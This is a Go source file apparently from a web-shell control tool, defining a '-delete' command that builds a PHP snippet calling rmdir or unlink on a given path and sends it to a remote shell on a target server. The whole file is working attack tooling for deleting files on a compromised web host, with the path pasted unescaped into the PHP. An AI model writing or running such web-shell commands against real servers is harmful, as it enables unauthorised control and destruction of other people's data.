package phpmodule

import (
	"errors"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboynik/services/kernel"
)

var Deleteitem = kernel.Item{
	Name: "-delete",
	Exec: func(l *kernel.Line, config *razboy.Config) kernel.Response {
		var (
			action  string
			scope   string
			args    []string
			err     error
			request *razboy.REQUEST
		)

		args = l.GetArg()

		if len(args) < 1 {
			return kernel.Response{Err: errors.New("You should give the path of the file to delete")}
		}

		scope = args[0]

		if config.Shellscope != "" {
			scope = config.Shellscope + "/" + scope
		}

		action = "if(is_dir('" + scope + "')){$r=rmdir('" + scope + "');}else{$r=unlink('" + scope + "');}" + razboy.AddAnswer(config.Method, config.Parameter)
		request = razboy.CreateRequest(action, config)

		_, err = razboy.Send(request)

		if err != nil {
			return kernel.Response{Err: err}
		}

		kernel.WriteSuccess(l.GetStdout(), "Delete successfully")

		return kernel.Response{Body: true}
	},
}
